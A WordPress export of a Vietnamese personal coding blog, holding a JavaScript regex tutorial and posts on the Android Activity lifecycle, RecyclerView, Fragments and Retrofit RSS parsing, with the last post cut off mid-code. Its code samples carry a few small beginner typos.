		<description></description>
		<content:encoded><![CDATA[<h2>1. Cú pháp Regex</h2>
<pre>
let patt1 = /^is/gmi;
let patt2 = new RegExp("\\w", "g");

let str = "\\w"
let patt3 = new RegExp(str, "g");
</pre>

<table>
<tbody>
<tr>
<td>i</td>
<td>insensitive</td>
<td>Không phân biệt chữ hoa hay thường</td>
</tr>
<tr>
<td>g</td>
<td>global </td>
<td>Tìm hết trong chuỗi, ra kết quả vẫn tìm tiếp</td>
</tr>
<tr>
<td>m</td>
<td>multiline </td>
<td>Tìm kiếm nhiều dòng</td>
</tr>
<tr>
</tbody>
</table>

<h2>2. Cách viết Pattern</h2>
<table>
<tbody>
<tr>
<td>K&yacute; tự</td>
<td>Giải th&iacute;ch</td>
</tr>
<tr>
<td>[ACm05]</td>
<td>hoặc"A", hoặc "C", hoặc "m", hoặc "0", hoặc "5"</td>
</tr>
<tr>
<td>[A-Z]</td>
<td>từ A đến Z chữ hoa</td>
</tr>
<tr>
<td>[a-z]</td>
<td>từ a đến Z chữ thường</td>
</tr>
<tr>
<td>[A-z]</td>
<td>từ A hoa đến z thường</td>
</tr>
<tr>
<td>[e-h]</td>
<td>từ&nbsp;e đến h</td>
</tr>
<tr>
<td>[0-9]</td>
<td>từ 0 đến 9</td>
</tr>
<tr>
<td>[3-7]</td>
<td>từ&nbsp;3 đến&nbsp;7</td>
</tr>
<tr>
<td>[A-C2-5q]</td>
<td>hoặc từ A đến C, hoặc 2 đến 5, hoặc q</td>
</tr>
<tr>
<td colspan="2">
let pattern =&nbsp;/[A-C2-5q]/g; 
let string =&nbsp;"<span style="color: #ff0000;">ABC</span>DE 1<span style="color: #ff0000;">2</span>0<span style="color: #ff0000;">2</span>0<span style="color: #ff0000;">5</span>8 mnnop<span style="color: #ff0000;">qqq</span>rs"; 
let result = string.match(pattern); 
//result:&nbsp;A,B,C,2,2,5,q,q,q</td>
</tr>
<tr>
<td>[^DEn27]</td>
<td>kh&ocirc;ng c&oacute; "D","E","n","2","7"</td>
</tr>
<tr>
<td>[^C-Z]</td>
<td>kh&ocirc;ng c&oacute; chữ "C" đến "Z"</td>
</tr>
<tr>
<td>[^A-e]</td>
<td>kh&ocirc;ng c&oacute; chữ A hoa đến e thường</td>
</tr>
<tr>
<td>[^1-4]</td>
<td>kh&ocirc;ng c&oacute; từ 1 đến 4</td>
</tr>
<tr>
<td>[^A-C2-5q]</td>
<td>kh&ocirc;ng c&oacute; từ A đến C, từ 2 đến 5,&nbsp;v&agrave;&nbsp;q</td>
</tr>
<tr>
<td colspan="2">
let pattern = /[^A-C2-5q]/g; 
let string =&nbsp;"ABC<span style="color: #ff0000;">DE 1</span>2<span style="color: #ff0000;">0</span>2<span style="color: #ff0000;">0</span>5<span style="color: #ff0000;">8</span>&nbsp;<span style="color: #ff0000;">mnnop</span>qqq<span style="color: #ff0000;">rs</span>"; 
let result = string.match(pattern); 
//result: D,E, ,1,0,0,8, ,m,n,n,o,p,r,s</td>
</tr>
<tr>
<td>a+</td>
<td>c&oacute; 1&nbsp;hoặc nhiều chữ&nbsp;a</td>
</tr>
<tr>
<td>a*</td>
<td>kh&ocirc;ng c&oacute; hoặc nhiều chữ a</td>
</tr>
<tr>
<td>a?</td>
<td>c&oacute; 0 hoặc 1 chữ a</td>
</tr>
<tr>
<td colspan="2">
<p>var str = "He<span style="color: #ff0000;">ll</span><span style="color: #0000ff;">ooo</span> Wor<span style="color: #ff0000;">l</span>d! He<span style="color: #ff0000;">ll</span><span style="color: #0000ff;">o</span> W3Schoo<span style="color: #ff0000;">l</span>s!";</p>
var patt1 = /lo+/g; 
var patt2 = /lo*/g; 
var patt3 = /lo?/g; 
let result = str.match(patt); 
//patt1: chữ "l" + c&oacute; &iacute;t nhất 1 chữ "o"&nbsp;=&gt;&nbsp; looo,lo 
//patt2:&nbsp;chữ "l"&nbsp;+ kh&ocirc;ng c&oacute; hoặc&nbsp;c&oacute; nhiều chữ "o"&nbsp;=&gt; l,looo,l,l,lo,l 
//patt3: chữ "l"&nbsp;+ kh&ocirc;ng&nbsp;c&oacute; hoặc c&oacute; 1 chữ "o" =&gt;&nbsp;l,lo,l,l,lo,l</td>
</tr>
<tr>
<td>\d{4}</td>
<td>c&oacute; 4 số liền nhau</td>
</tr>
<tr>
<td>\d{2,4}</td>
<td>c&oacute; từ 2 đến 4 số liền nhau</td>
</tr>
<tr>
<td>\d{3,}</td>
<td>c&oacute; &iacute;t nhất 3 số liền nhau</td>
</tr>


<tr>
<td>.</td>
<td>ký tự đơn bất kỳ, ngoài ký tự xuống dòng</td>
</tr>


<tr>
<td>/\d$/g</td>
<td>c&oacute; số ở cuối chuỗi</td>
</tr>
<tr>
<td>/^\d/g</td>
<td>c&oacute; số ở đầu chuỗi</td>
</tr>
<tr>
<td>/(red|green|\d)/g</td>
<td>chữ "red" hoặc "green" hoặc một số</td>
</tr>
<tr>
<td>\w</td>
<td>bao gồm từ a-z,A-Z,0-9, kể cả _ (dấu gạch dưới)</td>
</tr>
<tr>
<td>\W</td>
<td>ngược lại&nbsp;\w</td>
</tr>
<tr>
<td>\d</td>
<td>một số bất kỳ, giống [0-9]</td>
</tr>
<tr>
<td>\D</td>
<td>ngược lại \d, giống [^0-9]</td>
</tr>
<tr>
<td>\s</td>
<td>k&yacute; tự trắng: dấu c&aacute;ch, dấu tab, xuống d&ograve;ng</td>
</tr>
<tr>
<td>\S</td>
<td>ngược lại \s</td>
</tr>
<tr>
<td>\b</td>
<td>bắt đầu hoặc kết th&uacute;c 1 từ, t&ugrave;y vị tr&iacute; viết \b</td>
</tr>
<tr>
<td>\B</td>
<td>ngược lại của \b, kh&ocirc;ng ở đầu hoặc cuối</td>
</tr>
<tr>
<td>\n</td>
<td>k&yacute; tự xuống d&ograve;ng</td>
</tr>
<tr>
<td>\t</td>
<td>k&yacute; tự tab</td>
</tr>
<tr>
<td colspan="2">
let str = "ABC A2019 xyz";
let patt1 = /\b\w/g; 
let patt2 = /\d\b/g; 
let patt3 = /\B\w/g;
let patt4 = /\d\B/g; 
let result = str.match(patt); 
//patt1: chữ bất kỳ ở đầu một từ =&gt; A,A,x 
//patt2:&nbsp;số&nbsp;bất kỳ ở&nbsp;cuối một&nbsp;từ&nbsp;=&gt;&nbsp;9 
//patt3: chữ bất kỳ kh&ocirc;ng ở đầu một&nbsp;từ=&gt;&nbsp;B,C,2,0,1,9,y,z 
//patt4: số bất kỳ, kh&ocirc;ng ở cuối một&nbsp;từ=&gt;2,0,1</td>
</tr>
</tbody>
</table>

<h2>3. Các phương thức sử dụng trong Regex</h2>
- Bao gồm: match, exec, test
<pre>
var str = "The rain in SPAIN stays mainly in the plainn";
var patt = /ain|haha/g
var res1 = str.match(patt);
var res2 = patt.exec(str);
var res3 = patt.test(str);
//result: 
res1 => ain,ain,ain
res2 => ain
res3 => true
</pre>

<h2>4. Một số ví dụ đặc biệt:</h2>
4.1. containsNumber : /\d+/,
4.2. containsAlphabet : /[a-zA-Z]/,

4.3. onlyLetters : /^[A-Za-z]+$/,
4.4. onlyNumbers : /^[0-9]+$/,
4.5. Tìm ký tự theo sau: (?=n)
Công thức: ?=n
<pre>
var str = "AZ và AB: Tìm chữ A nào có chữ Z đi theo sau";
var patt1 = /A(?=Z)/;
var patt1 = /A(?=Z)/;
var result = str.match(patt1); //result: A

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>280</wp:post_id>
		<wp:post_date><![CDATA[2020-05-09 21:01:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-05-09 21:01:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-05-09 21:01:56]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-05-09 21:01:56]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascript-regex-bieu-thuc-chinh-quy]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[Activity - Lifecycle]]></title>
		<link>https://duycode.com/2020/05/24/activity-lifecycle/</link>
		<pubDate>Sun, 24 May 2020 18:32:55 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=291</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
package com.example.tests;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {
    private String TAG = "MainActivity";
    public ActivityMainBinding mainBinding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e(TAG,"onCreate");
        mainBinding = DataBindingUtil
                .setContentView(this,R.layout.activity_main);
        //setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e(TAG,"onStart");
    }
    @Override
    protected void onResume() {
        super.onResume();
        Log.e(TAG,"onResume");
    }
    @Override
    protected void onPause() {
        super.onPause();
        Log.e(TAG,"onResume");
    }
    @Override
    protected void onStop() {
        super.onStop();
        Log.e(TAG,"onStop");
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.e(TAG,"onDestroy");
    }
}
</pre>
<img src="https://i0.wp.com/yellowcodebooks.com/wp-content/uploads/2017/10/activity_lifecycle.png" alt="activity" />

<h2>Tổng quan</h2>
foreground là trạng thái activity được hiển thị và tương tác với người dùng
background là trạng thái activity bị ẩn 1 phần hoặc toàn bộ. Mà khi ần thì người dùng ko thấy và tương tác được.
.onCreate và onDestroy chỉ xảy ra 1 lần duy nhất trong cả vòng đới activity]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>291</wp:post_id>
		<wp:post_date><![CDATA[2020-05-24 18:32:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-05-24 18:32:55]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-05-24 18:32:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-05-24 18:32:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[activity-lifecycle]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Android manifest]]></title>
		<link>https://duycode.com/2020/05/24/android-manifest/</link>
		<pubDate>Sun, 24 May 2020 18:57:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=297</guid>
		<description></description>
		<content:encoded><![CDATA[android manifest là file điều hướng cấu hình hiển thị và khai báo các nút cảnh trên ứng dụng android
allowbackup: để true là khi khôi phục lại sữ khôi phục lại dữ liệu đã mất]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>297</wp:post_id>
		<wp:post_date><![CDATA[2020-05-24 18:57:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-05-24 18:57:37]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-05-24 18:57:37]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-05-24 18:57:37]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android-manifest]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[RecycleView - Cơ bản]]></title>
		<link>https://duycode.com/2020/06/12/recycleview-co-ban/</link>
		<pubDate>Fri, 12 Jun 2020 22:50:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=300</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Implement thư viện:</h2>
- Sử dụng thư viện của Material: <a href="https://material.io/develop/android/docs/getting-started/" rel="noopener noreferrer" target="_blank">https://material.io/develop/android/docs/getting-started/</a>
- Vào Gradle Scripts -> build.gradle (Module:app)
- Thêm vào trong dependencies {} dòng sau:
<pre>implementation 'com.google.android.material:material:+'</pre>

<h2>2. Tạo Class Student (folder: app/java/com.example.test)</h2>
<pre>
package com.example.projectname;

public class Student {
    private String name;
    private Double point;

    public Student(String name, Double point) {
        this.name = name;
        this.point = point;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public Double getPoint() {
        return point;
    }

    public void setPoint(Double point) {
        this.point = point;
    }
}
</pre>

<h2>3. Tạo file item_layout.xml (folder: app/res/layout)</h2>
- Cần nhớ là: <em><strong>layout_height="wrap_content"</strong></em> nhá.
<pre>
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:padding="20dp"
    android:layout_width="match_parent"
    android:layout_height="wrap_content">
    <TextView
        android:id="@+id/tv_name"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:textSize="24sp"
        android:layout_weight="1"
        android:text="Name"/>
    <TextView
        android:id="@+id/tv_point"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:textSize="24sp"
        android:text="Point"/>
</LinearLayout>
</pre>

<h2>4. Sửa file activity_main.xml (folder: app/res/layout)</h2>
<pre>
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:orientation="vertical"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <androidx.recyclerview.widget.RecyclerView
        android:id="@+id/rv_list_student"
        app:layoutManager="androidx.recyclerview.widget.LinearLayoutManager"
        android:orientation="vertical"
        android:layout_width="match_parent"
        android:layout_height="match_parent">

    </androidx.recyclerview.widget.RecyclerView>
</LinearLayout>
</pre>

<h2>5. Tạo Class StudentAdapter (folder: app/java/com.example.nameproject)</h2>
<pre>
package com.example.test;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.recyclerview.widget.RecyclerView;

import java.util.ArrayList;


public class StudentAdapter extends RecyclerView.Adapter<StudentAdapter.StudentHolder> {
    private ArrayList<Student> studentArrayList;
    LayoutInflater inflater;

    public StudentAdapter(LayoutInflater inflater) {
        this.inflater = inflater;
    }

    public void setStudentArrayList(ArrayList<Student> studentArrayList) {
        this.studentArrayList = studentArrayList;
        notifyDataSetChanged();
    }

    @NonNull
    @Override
    public StudentHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        View studentView = inflater.inflate(R.layout.item_layout,parent,false);
        return new StudentHolder(studentView);
    }

    @Override
    public void onBindViewHolder(@NonNull StudentHolder holder, int position) {
        holder.bindView(studentArrayList.get(position));

    }

    @Override
    public int getItemCount() {
        return studentArrayList == null ? 0 : studentArrayList.size();
    }

    public class StudentHolder extends RecyclerView.ViewHolder {
        private TextView tvName;
        private TextView tvPoint;

        public StudentHolder(@NonNull View itemView) {
            super(itemView);
            tvName = itemView.findViewById(R.id.tv_name);
            tvPoint = itemView.findViewById(R.id.tv_point);
        }

        public void bindView(Student item){
            tvName.setText(item.getName());
            tvPoint.setText(item.getPoint()+"");
        }
    }
}

</pre>
<h2>6. Sửa Class MainActivity (folder: app/java/com.example.nameproject)</h2>
<pre>
package com.example.test;

import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.RecyclerView;

import android.os.Bundle;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    private RecyclerView rvStudent;
    private StudentAdapter studentAdapter;
    private ArrayList<Student> studentList = new ArrayList<>();


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
    }

    private void initView() {
        rvStudent = findViewById(R.id.rv_list_student);
        studentAdapter = new StudentAdapter(getLayoutInflater());
        rvStudent.setAdapter(studentAdapter);
        for (int i=0;i<100;i++){
            arrStudent.add(new Student("Duy",9.8));
            arrStudent.add(new Student("Trang",9.5));
            arrStudent.add(new Student("Dương",10.0));
        }
        studentAdapter.setStudentArrayList(studentList);
    }
}
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>300</wp:post_id>
		<wp:post_date><![CDATA[2020-06-12 22:50:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-12 22:50:41]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-12 22:50:41]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-12 22:50:41]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[recycleview-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Sử dụng Fragment trong Android]]></title>
		<link>https://duycode.com/2020/06/16/su-dung-fragment-trong-android/</link>
		<pubDate>Tue, 16 Jun 2020 16:13:42 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=310</guid>
		<description></description>
		<content:encoded><![CDATA[1. Tạo 3 layout (folder: app/res/layout) với background khác nhau (fragment_1.xml, fragment_2.xml, fragment_3.xml)
-- fragment_1.xml
<pre>
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:background="@android:color/holo_green_dark"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

</androidx.constraintlayout.widget.ConstraintLayout>
</pre>

2. Tạo package fragment (folder: app/java/com.example.testfragment). Sau đó tạo 3 Class tương ứng trong package: Fragment1.class, Fragment2.class, Fragment3.class
-- Fragment1.class
<pre>
package com.example.fragmenttest.fragment;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.example.fragmenttest.R;

public class Fragment1 extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_1,container,false);
    }
}
</pre>

3. Tạo Class TestFragmentAdapter.class (folder: app/java/com.example.fragmentest)
<pre>
package com.example.fragmenttest;

import androidx.annotation.NonNull;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentPagerAdapter;

public class TestFragmentAdapter extends FragmentPagerAdapter {
    private Fragment[] fragments;
    public TestFragmentAdapter(@NonNull FragmentManager fm, Fragment ... fragments) {
        super(fm, FragmentPagerAdapter.BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT);
        this.fragments = fragments;
    }

    @NonNull
    @Override
    public Fragment getItem(int position) {
        return fragments[position];
    }

    @Override
    public int getCount() {
        return fragments.length;
    }
}
</pre>

4. Tại MainActivity
<pre>
package com.example.fragmenttest;

import androidx.appcompat.app.AppCompatActivity;
import androidx.viewpager.widget.ViewPager;

import android.os.Bundle;

import com.example.fragmenttest.fragment.Fragment1;
import com.example.fragmenttest.fragment.Fragment2;
import com.example.fragmenttest.fragment.Fragment3;
import com.google.android.material.tabs.TabLayout;

public class MainActivity extends AppCompatActivity implements ViewPager.OnPageChangeListener {
    private ViewPager viewPager;
    private TestFragmentAdapter testFragmentAdapter;
    private TabLayout tabLayout;
    private Fragment1 fragment1 = new Fragment1();
    private Fragment2 fragment2 = new Fragment2();
    private Fragment3 fragment3 = new Fragment3();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
    }

    private void initView() {
        viewPager = findViewById(R.id.view_page);
        testFragmentAdapter = new TestFragmentAdapter(getSupportFragmentManager(),fragment1,fragment2,fragment3);
        viewPager.setAdapter(testFragmentAdapter);
    }

    @Override
    public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {

    }

    @Override
    public void onPageSelected(int position) {

    }

    @Override
    public void onPageScrollStateChanged(int state) {

    }
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>310</wp:post_id>
		<wp:post_date><![CDATA[2020-06-16 16:13:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-16 16:13:42]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-16 16:13:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-16 16:13:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[su-dung-fragment-trong-android]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Retrofit 2 - Nhận dữ liệu từ Google - RSS]]></title>
		<link>https://duycode.com/2020/06/20/retrofit-2-nhan-du-lieu-tu-google-rss/</link>
		<pubDate>Sat, 20 Jun 2020 00:42:39 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=317</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Link RSS từ Google</h2>
--XML search: <a href="https://news.google.de/news/feeds?pz=1&cf=vi_vn&ned=vi_vn&hl=vi_vn&q=MTP" rel="noopener noreferrer" target="_blank">https://news.google.de/news/feeds?pz=1&cf=vi_vn&ned=vi_vn&hl=vi_vn&q=MTP</a> 
- Thay "MTP" bằng cụm từ khóa tìm kiếm bất kỳ
- Dùng POSTMAN để kiểm tra API: <a href="https://www.postman.com/" rel="noopener noreferrer" target="_blank">https://www.postman.com/</a>
- Dạng file RSS thường trông như sau:
<pre>
<rss xmlns:media="http://search.yahoo.com/mrss/" version="2.0">
    <channel>
        <generator>NFE/5.0</generator>
        <title>"MTP" - Google Tin tức</title>
        <link>https://news.google.com/search?pz=1&cf=vi_vn&hl=vi&q=MTP&gl=VN&ceid=VN:vi</link>
        <language>vi</language>
        <webMaster>news-webmaster@google.com</webMaster>
        <copyright>2020 Google Inc.</copyright>
        <lastBuildDate>Mon, 22 Jun 2020 10:51:31 GMT</lastBuildDate>
        <description>Google Tin tức</description>
        <item>
            <title>Sky Tour Movie của Sơn Tùng MTP tốp 7 Trending của Youtube - Báo Pháp Luật TP.HCM</title>
            <link>https://plo.vn/giai-tri/xem-nghe-doc/sky-tour-movie-cua-son-tung-mtp-top-7-trending-cua-youtube-917039.html</link>
            <guid isPermaLink="false">CBMia2h0dHBzOi8vcGxvLnZuL2dpYWktdHJpL3hlbS1uZ2hlLWRvYy9za3ktdG91ci1tb3ZpZS1jdWEtc29uLXR1bmctbXRwLXRvcC03LXRyZW5kaW5nLWN1YS15b3V0dWJlLTkxNzAzOS5odG1s0gEA</guid>
            <pubDate>Sat, 06 Jun 2020 07:00:00 GMT</pubDate>
            <description><a href="https://plo.vn/giai-tri/xem-nghe-doc/sky-tour-movie-cua-son-tung-mtp-top-7-trending-cua-youtube-917039.html" target="_blank" rel="noopener noreferrer">Sky Tour Movie của Sơn Tùng MTP tốp 7 Trending của Youtube</a>&nbsp;&nbsp;<font color="#6f6f6f">Báo Pháp Luật TP.HCM</font></description>
            <source url="https://plo.vn">Báo Pháp Luật TP.HCM</source>
        </item>
        <item>
            <title>Sky Tour của Sơn Tùng M-TP: Toàn kể thành công, cố quên thất bại? - Tuổi Trẻ Online</title>
            <link>https://tuoitre.vn/sky-tour-cua-son-tung-m-tp-toan-ke-thanh-cong-co-quen-that-bai-20200613100020661.htm</link>
            <guid isPermaLink="false">CBMiZ2h0dHBzOi8vdHVvaXRyZS52bi9za3ktdG91ci1jdWEtc29uLXR1bmctbS10cC10b2FuLWtlLXRoYW5oLWNvbmctY28tcXVlbi10aGF0LWJhaS0yMDIwMDYxMzEwMDAyMDY2MS5odG3SAQA</guid>
            <pubDate>Sat, 13 Jun 2020 07:00:00 GMT</pubDate>
            <description><a href="https://tuoitre.vn/sky-tour-cua-son-tung-m-tp-toan-ke-thanh-cong-co-quen-that-bai-20200613100020661.htm" target="_blank" rel="noopener noreferrer">Sky Tour của Sơn Tùng M-TP: Toàn kể thành công, cố quên thất bại?</a>&nbsp;&nbsp;<font color="#6f6f6f">Tuổi Trẻ Online</font></description>
            <source url="https://tuoitre.vn">Tuổi Trẻ Online</source>
        </item>
        <item>.....</item>
        <item>.....</item>
        <item>.....</item>
    </channel>
</rss>

</pre>

<h2>II. Cấp quyền thư viện Retrofit 2</h2>
- Trang chủ: <a href="https://square.github.io/retrofit/" rel="noopener noreferrer" target="_blank">https://square.github.io/retrofit/</a>
<h3>1. Implement thư viện</h3>
<pre>
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
</pre>
<pre>
    implementation 'com.squareup.retrofit2:retrofit:+'
    implementation 'com.squareup.retrofit2:converter-simplexml:+'
</pre>
</h3>2. Cấp quyền Internet</h3>
<pre>
    <uses-permission android:name="android.permission.INTERNET"/>
</pre>


<h2>III. Tạo các Class theo RSS</h2>
<h3>1. RssFeed.java</h3>
<pre>
package com.example.retrofitrssgoogle;

import org.simpleframework.xml.Element;
import org.simpleframework.xml.Root;

@Root(name = "rss", strict = false)
public class RssFeed {
    @Element
    private RssChannel channel;

    public RssChannel getChannel() {
        return channel;
    }
}

</pre>

<h3>2. RssChannel.java</h3>
<pre>
package com.example.retrofitrssgoogle;

import org.simpleframework.xml.ElementList;
import org.simpleframework.xml.Root;

import java.util.ArrayList;
import java.util.List;

@Root(name = "channel", strict = false)
public class RssChannel {
    @ElementList(inline = true, required = false)
    private ArrayList<RssItem> items;

    public ArrayList<RssItem> getItems() {
        return items;
    }
}
</pre>

<h3>3. RssItem.java</h3>
<pre>
package com.example.retrofitrssgoogle;

import org.simpleframework.xml.Element;
import org.simpleframework.xml.Root;

@Root(name = "item", strict = false)
public class RssItem {
    @Element
    private String title;
    @Element
    private String link;
    @Element
    private String pubDate;
    @Element
    private String description;

    public String getTitle() {
        return title;
    }

    public String getLink() {
        return link;
    }

    public String getPubDate() {
        return pubDate;
    }

    public String getDescription() {
        return description;
    }

    @Override
    public String toString() {
        return title + '\n';
    }
}

</pre>

<h2>IV. Tạo class của Retrofit 2</h2>
<h3>1. interface RetrofitAPI.Class</h3>
<pre>
package com.example.retrofitrssgoogle;

import retrofit2.Call;
import retrofit2.http.GET;
import retrofit2.http.Query;

public interface RetrofitAPI {
    @GET("feeds?pz=1&cf=vi_vn&ned=vi_vn&hl=vi_vn")
    Call<RssFeed> getFeed(
            @Query("q") String q
    );
}
</pre>

<h3>2. RetrofitBuilder.java</h3>
<pre>
package com.example.retrofitrssgoogle;

import okhttp3.OkHttpClient;
import retrofit2.Retrofit;
import retrofit2.converter.simplexml.SimpleXmlConverterFactory;

public class RetrofitBuilder {
    private static RetrofitAPI retrofitAPI;
    public static RetrofitAPI getInstance(){
        if (retrofitAPI == null){
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("https://news.google.de/news/")
                    .client(new OkHttpClient())
                    .addConverterFactory(SimpleXmlConverterFactory.create())
                    .build();
            retrofitAPI = retrofit.create(RetrofitAPI.class);
        }
        return retrofitAPI;
    }
}
</pre>


<h2>V. Sử dụng</h2>
<pre>
String key = "MTP";
RetrofitBuilder.getInstance().getFeed(key).enqueue(new Callback<RssFeed>() {
    @Override
    public void onResponse(Call<RssFeed> call, Response<RssFeed> response) {
        if (response.isSuccessful()){
            RssFeed rssFeed = response.body();
            RssChannel rssChannel = rssFeed.getChannel();
            ArrayList<RssItem> items = rssChannel.getItems();
            //items chính là List danh sách nhận được để dùng cho RecycleView
            Toast.makeText(MainActivity.this, items.toString(), Toast.LENGTH_SHORT).show();
        }
        else {
            Toast.makeText(MainActivity.this, "Request Error", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
